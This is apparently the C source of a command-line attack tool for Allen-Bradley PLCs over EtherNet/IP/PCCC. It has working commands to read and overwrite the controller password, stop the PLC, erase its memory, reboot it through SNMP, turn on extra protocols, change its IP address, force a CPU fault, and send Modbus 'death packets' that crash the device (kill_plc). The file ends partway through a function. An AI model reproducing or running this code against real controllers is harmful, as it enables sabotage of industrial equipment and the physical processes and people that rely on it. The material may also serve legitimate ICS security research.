#include <stdio.h>
#include <sys/types.h>
#include <arpa/inet.h>
#include <netinet/in.h>
#include <sys/socket.h>
#include <netdb.h>
#include <pthread.h>
#include <signal.h>
#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <unistd.h>
#include <time.h>
#include <stdbool.h>
#include <ctype.h>

#include "libcli.h"

#ifdef __GNUC__
#define UNUSED(d) d __attribute__((unused))
#else
#define UNUSED(d) d
#endif

#define TCP 0
#define UDP 1

struct cli_def *cli;

void cli_start();

struct sockaddr_in server_addr;
int socket_fd;
const char cip_array[] = {0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x02, 0x00, 0x81, 0x00, 0x01, 0x00, 0x00, 0x91, 0x00};
char enip_session[] = {0x00, 0x00, 0x00, 0x00};
bool enip_connected = false;
bool response_received = false;
char response_buffer[1000000];
int response_size;
char device_ip[100];
pthread_t keepalive_thread;

pthread_mutex_t sending_request; //mutex for the multiple sending threads

void *keep_alive(void *arg);
uint16_t crc_16( const unsigned char *input_str, size_t num_bytes );


struct enip_header
{
    char command[2];
    char length[2];
    char session_handle[4];
    char status[4];
    char sender_context[8];
    char options[4];
    bool send_cip;
    char *data;
};


//-----------------------------------------------------------------------------
// Helper function - Makes the running thread sleep for the ammount of time
// in milliseconds
//-----------------------------------------------------------------------------
void sleep_us(int microseconds)
{
	struct timespec ts;
	ts.tv_sec = microseconds / 1000000;
	ts.tv_nsec = (microseconds % 1000000) * 1000;
	nanosleep(&ts, NULL);
}

void process_enip_messages(char *message, int size)
{
    if (memcmp(enip_session, &message[4], 4))
    {
        unsigned char messagebuffer[1000];
        unsigned char *p = messagebuffer;
        p += sprintf(p, "Registering enip session ");
        for (int i = 7; i > 3; i--)
        {
            p += sprintf(p, "%02x ", (unsigned char)message[i]);
        }
        cli_print(cli, messagebuffer);
        memcpy(enip_session, &message[4], 4);
    }
}

void *receive_packets(void *arg)
{
    sleep_us(100000); //give it a little delay
    
	while(1)
	{
		response_size = read(socket_fd, response_buffer, 1000000);
		if (response_size > 0)
            response_received = true;
        else
            response_received = false;
            
        //DEBUG FULL MSG
        /*
        if (response_received)
        {
            unsigned char messagebuffer[1000];
            unsigned char *p = messagebuffer;
            p += sprintf(p, "Rcv: ");
            for (int i = 0; i < rcv_size; i++)
            {
                p += sprintf(p, "%02x ", (unsigned char)buffer[i]);
            }
            cli_print(cli, messagebuffer);
        }
        */
	}
}

int receive_response(char *response)
{
    while(!response_received) {}
    
    if (response_received)
    {
        memcpy(response, response_buffer, response_size);
        response_received = false;
        return response_size;
    }
    
    cli_print(cli, "Timeout error: The device didn't respond to the request");
    
    return -1;
}

int connect_to_device(const char *host, int port, int protocol, struct sockaddr_in *srv_addr)
{
	//Declare variables
	struct hostent *server;
	int data_len;
	socklen_t cli_len;
	
	//Create TCP Socket
    int socketfd = 0;
    if (protocol == TCP) socketfd = socket(AF_INET, SOCK_STREAM, 0);
    else if (protocol == UDP) socketfd = socket(AF_INET, SOCK_DGRAM, 0);
	if (socketfd<0)
	{
		perror("Client: Error creating stream socket");
        return -1;
	}

	//Initialize Client Structures
	server = gethostbyname(host);
	if (server == NULL)
	{
		cli_print(cli, "Client: Error locating host %s\n", host);
        return -1;
	}
	bzero((char *)srv_addr, sizeof(*srv_addr));
	(*srv_addr).sin_family = AF_INET;
	(*srv_addr).sin_port = htons(port);
	bcopy((char *)server->h_addr, (char *)&(*srv_addr).sin_addr.s_addr, server->h_length);

	//Set timeout of 100ms on receive
	struct timeval tv;
	tv.tv_sec = 0;
	tv.tv_usec = 100000;
	if (setsockopt(socketfd, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv)) < 0)
	{
		cli_print(cli, "Client: Error setting timeout\n");
	}
	
	//Try to connect
	int connection_attempts = 1;
	while (connect(socketfd, (struct sockaddr *)srv_addr, sizeof(*srv_addr)) < 0)
	{
		perror("Client: Error connecting to server");
		connection_attempts--;
		if (connection_attempts == 0)
        {
            return -1;
        }
	}
	  
    return socketfd;
}

void send_message(struct enip_header header, int data_size)
{
    char message[10000];
    int index=24;
    memcpy(message, &header, 24);
    if (header.send_cip)
    {
        memcpy(&message[index], cip_array, sizeof(cip_array));
        index += sizeof(cip_array);
    }
    memcpy(&message[index], header.data, data_size);
    index += data_size;
    
    int data_len = sendto(socket_fd, message, index, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
    if (data_len < 0)
    {
        cli_print(cli, "Client: Error sending data on socket %d\n", socket_fd);
        perror("Client: ");
    }
    
    /*
    //DEBUG FULL MSG
    else if (data_len > 0)
    {
        unsigned char messagebuffer[1000];
        unsigned char *p = messagebuffer;
        p += sprintf(p, "Sent: ");
        for (int i = 0; i < data_len; i++)
        {
            p += sprintf(p, "%02x ", (unsigned char)message[i]);
        }
        cli_print(cli, messagebuffer);
        
    }
    //*/
}

int establish_enip_connection(struct cli_def *cli, const char *command, char *argv[], int argc)
{
    if (argc < 1)
    {
        cli_print(cli, "You need to specify an IP address to connect to.");
        enip_connected = false;
        return CLI_ERROR_ARG;
    }
    
    socket_fd = connect_to_device(argv[0], 44818, TCP, &server_addr);
    //Create the receiving thread
	pthread_t rcv_thread;
	int ret = -1;
	ret = pthread_create(&rcv_thread, NULL, receive_packets, NULL);
	if (ret == 0)
	{
		pthread_detach(rcv_thread);
	}
    
    if (socket_fd < 0)
    {
        cli_print(cli, "Error connecting to device. Make sure you have the right IP address.");
        enip_connected = false;
        return CLI_ERROR;
    }
    
    struct enip_header header;
    memcpy(header.command, (const char[]){(char)0x65,(char)0x00}, 2);
    memcpy(header.length, (const char[]){(char)0x04,(char)0x00}, 2);
    memcpy(header.session_handle, (const char[]){(char)0x00,(char)0x00,(char)0x00,(char)0x00}, 4);
    memcpy(header.status, (const char[]){(char)0x00,(char)0x00,(char)0x00,(char)0x00}, 4);
    memcpy(header.sender_context, (const char[]){(char)0x00,(char)0x00,(char)0x00,(char)0x00,(char)0x00,(char)0x00,(char)0x00,(char)0x00}, 8);
    memcpy(header.options, (const char[]){(char)0x00,(char)0x00,(char)0x00,(char)0x00}, 4);
    header.send_cip = false;
    char packet_data[] = {0x01, 0x00, 0x00, 0x00};
    header.data = packet_data;
    
    pthread_mutex_lock(&sending_request); //lock mutex
    send_message(header, 4);
    
    char device_response[10000];
    int rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size > 0)
    {
        process_enip_messages(device_response, rcv_size);
        enip_connected = true;
        
        //Create the keep-alive thread
        int ret = -1;
        ret = pthread_create(&keepalive_thread, NULL, keep_alive, NULL);
        if (ret == 0)
        {
            pthread_detach(keepalive_thread);
        }
    }
    
    strncpy(device_ip, argv[0], 100);
    
    return CLI_OK;
}

char *string_to_hex(char *hex_string[], int size)
{
    static char hex_array[1000];
    char *p = hex_array;
    for (int i = 0; i < size; i++)
    {
        sscanf(hex_string[i], "%2hhx", p);
        p++;
    }
    return hex_array;
}

char *generate_context()
{
    static char r[8];
    srand((unsigned)time(NULL));

    for (int i = 0; i < 8; ++i) 
        r[i] = rand();

    return r;
}

void send_pccc(char *pccc_message, int size)
{
    uint16_t enip_length = size + 17;
    char length_bytes[2];
    length_bytes[0] = (enip_length & 0x00FF);
    length_bytes[1] = (enip_length & 0xFF00) >> 8;
    
    struct enip_header header;
    memcpy(header.command, (const char[]){(char)0x6f,(char)0x00}, 2);
    memcpy(header.length, length_bytes, 2);
    memcpy(header.session_handle, enip_session, 4);
    memcpy(header.status, (const char[]){(char)0x00,(char)0x00,(char)0x00,(char)0x00}, 4);
    memcpy(header.sender_context, generate_context(), 8);
    memcpy(header.options, (const char[]){(char)0x00,(char)0x00,(char)0x00,(char)0x00}, 4);
    header.send_cip = true;
    
    char packet_data[1002];
    packet_data[0] = (size & 0x00FF);
    packet_data[1] = (size & 0xFF00) >> 8;
    memcpy(&packet_data[2], pccc_message, size);
    header.data = packet_data;
    
    send_message(header, size+2);
}

int send_raw_pccc(struct cli_def *cli, const char *command, char *argv[], int argc)
{
    if (argc < 1)
    {
        cli_print(cli, "You need to provide the message to be sent. Ex: send_raw_pccc 06 00 01 00 03");
        return CLI_ERROR_ARG;
    }
    
    if (!enip_connected)
    {
        cli_print(cli, "You need to connect to a device first!");
        return CLI_ERROR;
    }
    
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(string_to_hex(argv, argc), argc);
    
    char device_response[10000];
    int rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size > 40)
    {
        unsigned char messagebuffer[1000];
        unsigned char *p = messagebuffer;
        p += sprintf(p, "Rcv: ");
        for (int i = 41; i < rcv_size; i++)
        {
            p += sprintf(p, "%02x ", (unsigned char)device_response[i]);
        }
        cli_print(cli, messagebuffer);
        return CLI_OK;
    }
    else
    {
        cli_print(cli, "Error receiving PCCC response!");
        return CLI_ERROR;
    }
}

void *keep_alive(void *arg)
{
    while(1)
    {
        sleep_us(100000000);
        
        char keep_alive_packet[] = {0x6f, 0x00, 0x16, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x02, 0x00, 0x81, 0x00, 0x01, 0x00, 0x00, 0x91, 0x00, 0x05, 0x00, 0x06, 0x00, 0x01, 0x00, 0x03};
        memcpy(&keep_alive_packet[4], enip_session, 4);
        memcpy(&keep_alive_packet[12], generate_context(), 8);
        
        pthread_mutex_lock(&sending_request); //lock mutex
        int data_len = sendto(socket_fd, keep_alive_packet, 46, 0, (struct sockaddr *)&server_addr, sizeof(server_addr));
        if (data_len < 0)
        {
            cli_print(cli, "Client: Error sending data on socket %d\n", socket_fd);
            perror("Client: ");
            close(socket_fd);
            enip_connected = false;
            pthread_mutex_unlock(&sending_request); //unlock mutex
            break;
        }
        
        char device_response[10000];
        int rcv_size = receive_response(device_response);
        pthread_mutex_unlock(&sending_request); //unlock mutex
        if (rcv_size < 41 || device_response[42] != 0)
        {
            cli_print(cli, "The device closed the connection");
            enip_connected = false;
            close(socket_fd);
            break;
        } 
    }
}

int read_password(struct cli_def *cli, const char *command, char *argv[], int argc)
{   
    if (!enip_connected)
    {
        cli_print(cli, "You need to connect to a device first!");
        return CLI_ERROR;
    }
    
    char pccc_command[] = {0x0f, 0x00, 0x01, 0x08, 0xa2, 0x0a, 0x00, 0x00, 0x0b, 0x00};
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command, 10);
    
    char device_response[10000];
    int rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size > 44 && device_response[42] == 0)
    {
        char password[11];
        memcpy(password, &device_response[45], 10);
        password[10] = '\0';
        
        //Verify if password is encrypted
        for (int i = 0; i < 10; i++)
        {
            //printf("password[%d]: %c\n", i, password[i]);
            if (!isdigit(password[i]) && password[i] != 0)
            {
                cli_print(cli, "Password: [encrypted]");
                return CLI_OK;
            }
        }
        
        cli_print(cli, "Password: %s", password);
        return CLI_OK;
    }
    else
    {
        cli_print(cli, "Error retrieving password!");
        return CLI_ERROR;
    }
}

int write_password(struct cli_def *cli, const char *command, char *argv[], int argc)
{
    if (argc < 1)
    {
        cli_print(cli, "You need to provide the password to be written");
        return CLI_ERROR_ARG;
    }
    
    if (!enip_connected)
    {
        cli_print(cli, "You need to connect to a device first!");
        return CLI_ERROR;
    }
    
    if (strlen(argv[0]) > 10)
    {
        cli_print(cli, "The password cannot be bigger than 10 characters!");
        return CLI_ERROR;
    }
    
    for (int i = 0; i < strlen(argv[0]); i++)
    {
        if (!isdigit(argv[0][i]))
        {
            cli_print(cli, "The password must contain numbers only!");
            return CLI_ERROR;
        }
    }
    
    char pccc_command[1000]; 
    memcpy(pccc_command, (const char[]){(char)0x0f,(char)0x00,(char)0x01,(char)0x08,(char)0xaa,(char)0x0a,(char)0x00,(char)0x03,(char)0x0b,(char)0x00},10);
    memcpy(&pccc_command[10], (const char[]){(char)0,(char)0,(char)0,(char)0,(char)0,(char)0,(char)0,(char)0,(char)0,(char)0},10); //wipe previous password
    memcpy(&pccc_command[10], argv[0], strlen(argv[0])); //write new password
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command, 20);
    
    char device_response[10000];
    int rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex;
    if (rcv_size > 42 && device_response[42] == 0)
    {
        cli_print(cli, "Password \"%s\" written successfully", argv[0]);
        return CLI_OK;
    }
    else
    {
        cli_print(cli, "Error writing password!");
        return CLI_ERROR;
    }
}

int start_plc(struct cli_def *cli, const char *command, char *argv[], int argc)
{
    if (!enip_connected)
    {
        cli_print(cli, "You need to connect to a device first!");
        return CLI_ERROR;
    }
    
    char pccc_command[] = {0x0f, 0x00, 0x01, 0x08, 0x80, 0x06};
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command, 6);
    
    char device_response[10000];
    int rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size > 41 && device_response[42] == 0x00)
    {
        cli_print(cli, "PLC was placed in RUN mode");
        return CLI_OK;
    }
    else
    {
        cli_print(cli, "Error changing PLC mode!");
        return CLI_ERROR;
    }
}

int stop_plc(struct cli_def *cli, const char *command, char *argv[], int argc)
{
    if (!enip_connected)
    {
        cli_print(cli, "You need to connect to a device first!");
        return CLI_ERROR;
    }
    
    char pccc_command[] = {0x0f, 0x00, 0x01, 0x08, 0x80, 0x01};
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command, 6);
    
    char device_response[10000];
    int rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size > 41 && device_response[42] == 0x00)
    {
        cli_print(cli, "PLC was placed in PROG mode");
        return CLI_OK;
    }
    else
    {
        cli_print(cli, "Error changing PLC mode!");
        return CLI_ERROR;
    }
}

int get_device_info(struct cli_def *cli, const char *command, char *argv[], int argc)
{
    if (!enip_connected)
    {
        cli_print(cli, "You need to connect to a device first!");
        return CLI_ERROR;
    }
    
    
    struct enip_header header;
    memcpy(header.command, (const char[]){(char)0x6f,(char)0x00}, 2);
    memcpy(header.length, (const char[]){(char)0x16,(char)0x00}, 2);
    memcpy(header.session_handle, enip_session, 4);
    memcpy(header.status, (const char[]){(char)0x00,(char)0x00,(char)0x00,(char)0x00}, 4);
    memcpy(header.sender_context, generate_context(), 8);
    memcpy(header.options, (const char[]){(char)0x00,(char)0x00,(char)0x00,(char)0x00}, 4);
    header.send_cip = false;
    
    char packet_data[] = {0x00, 0x00, 0x00, 0x00, 0x1e, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x06, 0x00, 0x01, 0x02, 0x20, 0x01, 0x24, 0x01};
    header.data = packet_data;
    
    pthread_mutex_lock(&sending_request); //lock mutex
    send_message(header, 22);
    char device_response[10000];
    int rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    
    if (rcv_size > 42 && device_response[42] == 0x00)
    {
        unsigned char messagebuffer[10000];
        unsigned char *p = messagebuffer;
        
        p += sprintf(p, "Vendor ID: ");
        if (device_response[45] == 0x00 && device_response[44] == 0x01) p += sprintf(p, "Rockwell Automation/Allen-Bradley (0x0001)\n");
        else p += sprintf(p, "0x%02x%02x\n", (unsigned char)device_response[45], (unsigned char)device_response[44]);
        
        p += sprintf(p, "Device Type: ");
        if (device_response[47] == 0x00 && device_response[46] == 0x0e) p += sprintf(p, "Programmable Logic Controller (0x000e)\n");
        else p += sprintf(p, "0x%02x%02x\n", (unsigned char)device_response[47], (unsigned char)device_response[46]);
        
        p += sprintf(p, "Product Code: %d\n", ((uint16_t)device_response[49] << 8) | ((uint16_t)device_response[48]) );
        
        p += sprintf(p, "Revision: %d.%d\n", device_response[51], device_response[50]);
        
        p += sprintf(p, "Serial Number: 0x%02x%02x%02x%02x\n", (unsigned char)device_response[57], (unsigned char)device_response[56], (unsigned char)device_response[55], (unsigned char)device_response[54]);
        
        char product_name[1000];
        memcpy(product_name, &device_response[59], device_response[58]);
        product_name[device_response[58]] = '\0';
        p += sprintf(p, "Product Name: %s", product_name);

        cli_print(cli, messagebuffer);
        
        return CLI_OK;
    }
    else
    {
        cli_print(cli, "Error reading device information!");
        return CLI_ERROR;
    }
}

int wipe_memory(struct cli_def *cli, const char *command, char *argv[], int argc)
{
    if (!enip_connected)
    {
        cli_print(cli, "You need to connect to a device first!");
        return CLI_ERROR;
    }
    
    stop_plc(cli, command, argv, argc);
    
    char pccc_command[] = {0x0f, 0x00, 0x01, 0x08, 0x57};
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command, 5);
    
    char device_response[10000];
    int rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size > 41 && device_response[42] == 0x00)
    {
        cli_print(cli, "PLC memory was erased");
        return CLI_OK;
    }
    else
    {
        cli_print(cli, "Error erasing PLC! This command only works on FRN 14.02 and below");
        return CLI_ERROR;
    }
}

int reboot_plc(struct cli_def *cli, const char *command, char *argv[], int argc)
{
    if (!enip_connected)
    {
        cli_print(cli, "You need to connect to a device first!");
        return CLI_ERROR;
    }
    
    //stop PLC
    stop_plc(cli, command, argv, argc);
    
    //terminate current enip connection
    close(socket_fd);
    if (pthread_cancel(keepalive_thread) != 0)
    {
        cli_print(cli, "Warning: keep alive thread didn't stop");
    }
    pthread_mutex_unlock(&sending_request); //make sure mutex is unlocked
    enip_connected = false;
    
    //send SNMP packet
    struct sockaddr_in srv;
    int sfd = connect_to_device(device_ip, 161, UDP, &srv);
    if (sfd < 0)
    {
        cli_print(cli, "Error sending SNMP packet. Make sure SNMP is enabled on the device");
        return CLI_ERROR;
    }
    
    char snmp_packet[] = {0x30, 0x2e, 0x02, 0x01, 0x00, 0x04, 0x05, 0x77, 0x68, 0x65, 0x65, 0x6c, 0xa3, 0x22, 0x02, 0x04, 0x7d, 0x5b, 0x92, 0xce, 0x02, 0x01, 0x00, 0x02, 0x01, 0x00, 0x30, 0x14, 0x30, 0x12, 0x06, 0x0d, 0x2b, 0x06, 0x01, 0x04, 0x01, 0x5f, 0x02, 0x03, 0x01, 0x01, 0x01, 0x01, 0x00, 0x02, 0x01, 0x02};
    
    int data_len = sendto(sfd, snmp_packet, 48, 0, (struct sockaddr *)&srv, sizeof(srv));
    if (data_len < 0)
    {
        cli_print(cli, "Client: Error sending data on socket %d\n", sfd);
        perror("Client: ");
    }
    
    cli_print(cli, "Waiting for device to reboot...");
    sleep_us(17000000);
    
    cli_print(cli, "Reconnecting...");
    char *devip[1];
    devip[0] = device_ip;
    return establish_enip_connection(cli, command, devip, 1);
}

int enable_protocols(struct cli_def *cli, const char *command, char *argv[], int argc)
{
    if (!enip_connected)
    {
        cli_print(cli, "You need to connect to a device first!");
        return CLI_ERROR;
    }
    
    stop_plc(cli, command, argv, argc);
    
    //Get edit resource
    char pccc_command0[] = {0x0f, 0x00, 0x01, 0x08, 0x11};
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command0, 5);
    char device_response[10000];
    int rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size < 41 || device_response[42] != 0x00)
    {
        cli_print(cli, "Error sending enable protocols command");
        return CLI_ERROR;
    }
    
    //Read port info
    char channel_info[1000];
    char pccc_command1[] = {0x0f, 0x00, 0x00, 0x00, 0xa2, 0x50, 0x01, 0x49, 0x00, 0x00};
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command1, 10);
    rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size < 41 || device_response[42] != 0x00)
    {
        cli_print(cli, "Error sending enable protocols command");
        return CLI_ERROR;
    }
    memcpy(channel_info, &device_response[45], 80);
    
    char pccc_command2[] = {0x0f, 0x00, 0x00, 0x00, 0xa2, 0x50, 0x01, 0x49, 0x00, 0x28};
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command2, 10);
    rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size < 41 || device_response[42] != 0x00)
    {
        cli_print(cli, "Error sending enable protocols command");
        return CLI_ERROR;
    }
    memcpy(&channel_info[80], &device_response[45], 54);
    
    //Send new configuration
    char pccc_command3[1000];
    memcpy(pccc_command3, (const char[]){(char)0x0f,(char)0x00,(char)0x01,(char)0x08,(char)0xaa,(char)0x50,(char)0x01,(char)0x49,(char)0x00,(char)0x28},10);
    memcpy(&pccc_command3[10], &device_response[45], 80);
    pccc_command3[57] = 0x23; //enable protocols
    channel_info[127] = 0x23; //make the same change for the crc calculator
    uint16_t crc_calc = crc_16(channel_info, 134);
    pccc_command3[64] = (char)(crc_calc & 0x00FF);
    pccc_command3[65] = (char)(crc_calc >> 8);
    
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command3, 90);
    rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size < 41 || device_response[42] != 0x00)
    {
        cli_print(cli, "Error sending enable protocols command");
        return CLI_ERROR;
    }
    
    //Apply port configuration
    char pccc_command4[] = {0x0f, 0x00, 0x01, 0x08, 0x8f, 0x00, 0x00, 0x00};
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command4, 8);
    rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size < 41 || device_response[42] != 0x00)
    {
        cli_print(cli, "Error sending enable protocols command");
        return CLI_ERROR;
    }
    
    //Return edit resource
    char pccc_command5[] = {0x0f, 0x00, 0x01, 0x08, 0x12};
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command5, 5);
    rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size < 41 || device_response[42] != 0x00)
    {
        cli_print(cli, "Error sending enable protocols command");
        return CLI_ERROR;
    }
    
    cli_print(cli, "SNMP, HTTP and Modbus enabled. [REBOOT REQUIRED]");
}

int kill_plc(struct cli_def *cli, const char *command, char *argv[], int argc)
{
    if (!enip_connected)
    {
        cli_print(cli, "You need to connect to a device first!");
        return CLI_ERROR;
    }
    
    enable_protocols(cli, command, argv, argc);
    reboot_plc(cli, command, argv, argc);
    
    //stop PLC
    stop_plc(cli, command, argv, argc);
    
    //terminate current enip connection
    close(socket_fd);
    if (pthread_cancel(keepalive_thread) != 0)
    {
        cli_print(cli, "Warning: keep alive thread didn't stop");
    }
    pthread_mutex_unlock(&sending_request); //make sure mutex is unlocked
    enip_connected = false;
    
    //send death packet
    struct sockaddr_in srv;
    int sfd = connect_to_device(device_ip, 502, TCP, &srv);
    if (sfd < 0)
    {
        cli_print(cli, "Error sending death packet. Make sure Modbus is enabled on the device");
        return CLI_ERROR;
    }
    
    char death_packet1[] = {0x00, 0xad, 0x00, 0x00, 0x00, 0xff, 0x01, 0x05, 0x00, 0x43, 0xff, 0x00};
    char death_packet2[] = {0x07, 0x1b, 0x00, 0x00, 0x00, 0x06, 0x01};
    
    int data_len = sendto(sfd, death_packet1, 12, 0, (struct sockaddr *)&srv, sizeof(srv));
    if (data_len < 0)
    {
        cli_print(cli, "Client: Error sending data on socket %d\n", sfd);
        perror("Client: ");
    }
    
    sleep_us(100000);
    
    data_len = sendto(sfd, death_packet2, 7, 0, (struct sockaddr *)&srv, sizeof(srv));
    if (data_len < 0)
    {
        cli_print(cli, "Client: Error sending data on socket %d\n", sfd);
        perror("Client: ");
    }
    
    sleep_us(100000);
    
    data_len = sendto(sfd, death_packet1, 12, 0, (struct sockaddr *)&srv, sizeof(srv));
    if (data_len < 0)
    {
        cli_print(cli, "Client: Error sending data on socket %d\n", sfd);
        perror("Client: ");
    }
    
    cli_print(cli, "0xdeafbeef");
    
    return CLI_OK;
}

void ip_to_byte_array(char *ip_string, char *byte_array)
{
    int i = 0, j = 3;
    for (int a = 0; a < 4; a++) byte_array[a] = 0;
    
    while (ip_string[i] != '\0') 
    {
        if (isdigit((unsigned char)ip_string[i]))
        {
            byte_array[j] *= 10;
            byte_array[j] += ip_string[i] - '0';
        } 
        else
            j--;
        i++;
        
        if (j < 0) break;
    }
}

int change_ip(struct cli_def *cli, const char *command, char *argv[], int argc)
{
    if (!enip_connected)
    {
        cli_print(cli, "You need to connect to a device first!");
        return CLI_ERROR;
    }
    
    if (argc < 1)
    {
        cli_print(cli, "You need to provide the new IP address");
        return CLI_ERROR_ARG;
    }
    
    //read current configuration
    struct enip_header header;
    memcpy(header.command, (const char[]){(char)0x6f,(char)0x00}, 2);
    memcpy(header.length, (const char[]){(char)0x18,(char)0x00}, 2);
    memcpy(header.session_handle, enip_session, 4);
    memcpy(header.status, (const char[]){(char)0x00,(char)0x00,(char)0x00,(char)0x00}, 4);
    memcpy(header.sender_context, generate_context(), 8);
    memcpy(header.options, (const char[]){(char)0x00,(char)0x00,(char)0x00,(char)0x00}, 4);
    header.send_cip = false;
    
    char packet_data[] = {0x00, 0x00, 0x00, 0x00, 0x1e, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x08, 0x00, 0x0e, 0x03, 0x20, 0xf5, 0x24, 0x01, 0x30, 0x05};
    header.data = packet_data;
    
    pthread_mutex_lock(&sending_request); //lock mutex
    send_message(header, 24);
    char device_response[10000];
    int rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    
    if (rcv_size < 42 || device_response[42] != 0x00)
    {
        cli_print(cli, "Error reading device information!");
        return CLI_ERROR;
    }
    
    memcpy(header.command, (const char[]){(char)0x6f,(char)0x00}, 2);
    memcpy(header.length, (const char[]){(char)0x2e,(char)0x00}, 2);
    memcpy(header.session_handle, enip_session, 4);
    memcpy(header.status, (const char[]){(char)0x00,(char)0x00,(char)0x00,(char)0x00}, 4);
    memcpy(header.sender_context, generate_context(), 8);
    memcpy(header.options, (const char[]){(char)0x00,(char)0x00,(char)0x00,(char)0x00}, 4);
    header.send_cip = false;
    
    char packet_data1[] = {0x00, 0x00, 0x00, 0x00, 0x1e, 0x00, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00, 0xb2, 0x00, 0x1e, 0x00, 0x10, 0x03, 0x20, 0xf5, 0x24, 0x01, 0x30, 0x05, 0x03, 0x89, 0xa8, 0xc0, 0x00, 0x00, 0x00, 0xff, 0x01, 0x89, 0xa8, 0xc0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};
    char new_ip[4];
    ip_to_byte_array(argv[0], new_ip);
    memcpy(&packet_data1[24], new_ip, 4);
    memcpy(&packet_data1[28], &device_response[48], 18);
    header.data = packet_data1;
    
    pthread_mutex_lock(&sending_request); //lock mutex
    send_message(header, 46);
    rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    
    if (rcv_size < 42 || device_response[42] != 0x00)
    {
        cli_print(cli, "Error changing device IP!");
        return CLI_ERROR;
    }
    
    //terminate current enip connection
    close(socket_fd);
    if (pthread_cancel(keepalive_thread) != 0)
    {
        cli_print(cli, "Warning: keep alive thread didn't stop");
    }
    pthread_mutex_unlock(&sending_request); //make sure mutex is unlocked
    enip_connected = false;
    
    cli_print(cli, "Device IP changed to: %s", argv[0]);
    
    return CLI_OK;
}

int force_cpu_fault(struct cli_def *cli, const char *command, char *argv[], int argc)
{
    if (!enip_connected)
    {
        cli_print(cli, "You need to connect to a device first!");
        return CLI_ERROR;
    }
    
    stop_plc(cli, command, argv, argc);
    
    //Set HSC Error and Auto-start bits
    char pccc_command0[] = {0x0f, 0x00, 0x01, 0x08, 0xab, 0x02, 0x00, 0xe0, 0x00, 0x02, 0x60, 0x00, 0x60, 0x00};
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command0, 14);
    char device_response[10000];
    int rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size < 41 || device_response[42] != 0x00)
    {
        cli_print(cli, "Unable to set error bits");
        return CLI_ERROR;
    }
    
    start_plc(cli, command, argv, argc);
    
    //Clear HSC Error and Auto-start bits
    char pccc_command1[] = {0x0f, 0x00, 0x01, 0x08, 0xab, 0x02, 0x00, 0xe0, 0x00, 0x02, 0x20, 0x00, 0x00, 0x00};
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command1, 14);
    rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size < 41 || device_response[42] != 0x00)
    {
        cli_print(cli, "Warning: Unable to clear error bits");
        return CLI_ERROR;
    }
    
    char pccc_command2[] = {0x0f, 0x00, 0x01, 0x08, 0xab, 0x02, 0x00, 0xe0, 0x00, 0x02, 0x40, 0x00, 0x00, 0x00};
    pthread_mutex_lock(&sending_request); //lock mutex
    send_pccc(pccc_command2, 14);
    rcv_size = receive_response(device_response);
    pthread_mutex_unlock(&sending_request); //unlock mutex
    if (rcv_size < 41 || device_response[42] != 0x00)
    {
        cli_print(cli, "Warning: Unable to clear error bits");
        return CLI_ERROR;
    }
}

int clear_cpu_fault(struct cli_def *cli, const char *command, char *argv[], int argc)
{
    if (!enip_connected)
    {
        cli_print(cli, "You need to connect to a device first!");
        return CLI_ERROR;
    }
    
    char pccc_command0[] = {0x0f, 0x00, 0x01, 0x08, 0xab, 0x02, 0x02, 0x84, 0x05, 0x00, 0xff, 0xfc, 0x00, 0x00};
